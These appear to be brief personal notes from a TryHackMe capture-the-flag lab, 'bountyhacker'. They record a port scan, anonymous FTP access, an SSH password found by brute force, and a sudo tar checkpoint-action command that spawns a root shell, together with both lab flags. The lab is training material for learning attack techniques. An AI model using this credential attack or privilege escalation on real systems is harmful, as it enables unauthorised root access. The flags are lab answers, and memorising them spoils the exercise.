21/tcp open  ftp     vsftpd 3.0.3 
ftp-anon: Anonymous FTP login allowed (FTP code 230) 
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))                                                                                                                                    
OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel 

users maby:
Edward, Ein, Jet, Spike - lin from tasks.txt

Found user:pass combo for ssh
[22][ssh] host: 10.10.155.42   login: lin   password: RedDr4gonSynd1cat3

flag 1 in ssh user.txt - THM{CR1M3_SyNd1C4T3}

lin@bountyhacker:/$ sudo -l
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User lin may run the following commands on bountyhacker:
    (root) /bin/tar


command for priv esc
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

root.txt flag - THM{80UN7Y_h4cK3r}

